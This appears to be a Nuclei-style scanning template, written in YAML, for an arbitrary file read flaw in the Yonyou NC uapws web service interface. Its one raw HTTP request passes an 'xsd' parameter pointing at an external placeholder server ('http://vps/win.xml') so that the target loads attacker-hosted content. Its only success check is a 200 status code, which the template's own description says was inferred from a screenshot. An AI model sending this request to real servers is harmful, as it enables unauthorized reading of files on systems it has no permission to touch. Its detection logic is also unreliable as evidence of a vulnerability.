id: poc-dz5g4btd4eipbzfi
info:
  name: 用友NC-uapws接口存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2024
http:
- raw:
  - 'GET /uapws/service/nc.itf.bd.crm.IPsndocExportToCrmService?xsd=http://vps/win.xml HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
